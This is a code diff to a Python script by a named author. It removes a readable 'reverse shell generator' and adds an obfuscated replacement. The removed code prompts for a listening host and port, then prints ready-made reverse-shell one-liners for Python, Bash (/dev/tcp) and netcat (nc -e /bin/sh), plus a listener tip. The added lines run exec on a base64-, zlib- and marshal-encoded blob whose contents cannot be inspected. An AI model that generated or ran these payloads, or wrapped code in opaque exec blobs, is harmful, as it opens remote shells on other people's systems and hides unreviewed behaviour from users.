@@ -1,31 +1,3 @@
-# CREATED BY: RAMIZ UDDIN
-import os, sys, time, subprocess
-
-def tool_header(name):
-    os.system("clear")
-    print("\033[1;36m" + "="*45)
-    print(f"      {name.upper()}")
-    print("      CREATED BY: RAMIZ UDDIN")
-    print("="*45 + "\033[0m")
-
-def run():
-    tool_header("REVERSE SHELL GENERATOR (MULTI-LANG)")
-    print("\033[1;32m[*] Generate one-liner reverse shell payloads.\033[0m")
-    
-    ip = input("\n\033[1;33mEnter Your LHOST (Listening IP): \033[0m")
-    port = input("Enter Your LPORT (Listening Port): \033[0m")
-    
-    print("\n\033[1;32m[+] Python (Linux):\033[0m")
-    print(f'python -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\'')
-    
-    print("\n\033[1;32m[+] Bash (TCP):\033[0m")
-    print(f'bash -i >& /dev/tcp/{ip}/{port} 0>&1')
-    
-    print("\n\033[1;32m[+] Netcat (Classic):\033[0m")
-    print(f'nc -e /bin/sh {ip} {port}')
-    
-    print("\n\033[1;33m[*] Tip: Start your listener using nc -lvnp {port}\033[0m")
-    
-    input("\n[Press Enter to Return]")
-
-if __name__ == "__main__": run()
+# ENCRYPTED BY: RAMIZ UDDIN ULTIMATE OBFUSCATOR
+# SOURCE PROTECTED. DO NOT TAMPER.
+import marshal,zlib,base64;exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJyVVeFP20YUt+NzgIQBpdO0lnW9Rh3EHUkggU4LJVKAQCPSkMWBtQsoMo4H1hzbunNo42kS2pfxsdM0jX2YlI/btD/GEq4mWXxbpWnfULs/YOdL0gU109STfO/eu/d7d/d+d89/MH0t0JUvC6T7nhEZkd1kUEeyiKUygAJUcogTA9cZBESO9PxuUATphwwjDTPMLh9hFruhIHPAHrAC/5evFGW2bzWefJy/2q90teqriXKAea1FyJqLbC9mle/ZxcBAK7fNlIdej9Lb1RiTGowDA638v9YDRggWPV7WFAnZC1PV+aXU3cbymzQ7CGmzb3TkajmXreTW4MqjNCxnH+Q/g9tra/miPf9GUaeqcw0BeAEDe0HcwpbS8HgTqbrl8U3TVJDAekCXGgr2TwI9xgtbhqHVDhWpriAUJkZAPpwh3TFzDoLf5L/Onxy44J1zMOKEbroAksHJ+tOFH9Lfpr+79zTuhG65IEJnBRfcoYP3noEbL/08yf1JH+rxvMBSnl/dgUuMcv/HaM+qD+RLZ/si8APjBrcJ7+LQNkv64dRgn5GB1hBFhily9D+Qbw20jlHkuI9MgYEeEwNPe+XSjZss2rfLuZ1cWcxB8X6uUIAbuWKunK1slWH0wXahko8VssUNwf6YXshko3pnD24ouoIkS4GGrsQ0lSgQKUcKwgrEh4qmQVNqaYZUx3H/7tixEMWmGjndIq6PjCaChftbYgVGCyq5T7qqH8B8SUhD6j7T71baKl9yKxnI6jneDPX29OEeLLWsQ0P3XfXmEyFNHWpmxxiT4YzaMAkUYkP+QrFmDTxrWq0lvNzR4x0R7WrZ9Vq+mKvMdlVxa3WzJlbIY3ogLOG4bOi6IlvRaMQORGbtXUFYMnC83jSTURz/XNUU3YgKs3MDrfMDrUlhiewmjk3psR6NJPZVPbEv4cOIMGNP9Z9xhRhhtLJa6p7vbd8LxlSYmYaJunKUsGQz4bEJm4dzmel5+1Y/uKhYsmTB6KomYazK3RBjugxjCqRrklgeC+1Mjy6f6opqpqFoSSR1LZ8QjTJB6Glinw4frR3pJvzSz+5XNOS7oWoJKRjDDo+WAcuK1UT6nsDRaoD8V+vxqm42LSHgBVTTAz4a+7UZQhTypznU1NFVMvIR+DemUzvGnYm7LviIVoRNFxSej4w547mzkfXjlfPwhHNl+SycOV577k8nXZDy/UY1p2E4mumYyMGPHfTkgmFa7A5HRPhT7m/yr3jIUUDcBQkKgO3JNmhn2/X2zs+LTmjeBUnqsOCCRb9SFU+Tp7dPpTY4PXJC0y6YobOfuKBMBx88A9No1D/DcK3WkFS9VhOGEE8PRcqnByy1oXgh3Nw3kSGTPHWScrWL8CtprfYLQ0N0cjF8r2HUm5qSQdeJ6r9ePE26C45l2T8Z+DsDXwCeff/F2CQ7cxFlwOiJfcZd+zH106LDXaNx/gEi/LXV'))))
